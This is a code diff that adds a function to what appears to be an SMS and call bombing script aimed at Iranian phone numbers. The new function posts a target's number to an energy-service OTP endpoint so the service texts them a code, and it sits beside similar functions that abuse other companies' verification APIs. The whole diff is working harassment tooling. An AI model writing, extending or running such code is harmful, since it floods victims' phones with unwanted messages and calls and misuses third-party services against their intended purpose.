@@ -69,6 +69,20 @@ def paklean_call(phone):
         print(f'{r}[!] Paklean - Call Exception: {e}{a}')
         return False
 
+def barghman(phone):
+    url = "https://uiapi2.saapa.ir/api/otp/sendCode"
+    payload = {"mobile": "0" + phone.split("+98")[1], "from_meter_buy": False}
+    try:
+        response = post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(Bargh-e Man) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (Bargh-e Man) Failed or No Response{a}')
+    except Exception as e:
+        print(f'{r}[!] Bargh-e Man Exception: {e}{a}')
+        return False
+
 def ragham_call(phone):
     url = "https://web.raghamapp.com/api/users/code"
     payload = {"phone": phone}  # اینجا نیازی به 0 نیست، همون phone که میدی
